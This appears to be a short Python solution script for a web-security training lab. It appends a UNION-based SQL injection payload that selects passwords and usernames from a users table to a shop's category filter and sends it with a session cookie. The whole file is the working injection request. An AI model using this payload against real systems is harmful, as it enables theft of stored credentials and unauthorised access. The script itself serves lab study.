#!/usr/bin/env python3

import urllib.parse
import requests

#SQL injection UNION attack, retrieving data from other tables

link = "https://ac661fd91f2f7d7dc02b47f800f900df.web-security-academy.net/filter?category=Gifts"
chunk = "' UNION SELECT password,username FROM users--"
url = link + urllib.parse.quote(chunk)

payload={}
headers = {
  'Cookie': 'session=Ttb0Yh2Tue7JP4JebQiwHNNBNEVgxzCA'
}

response = requests.request("GET", url, headers=headers, data=payload)

print(url)
print(response.status_code)
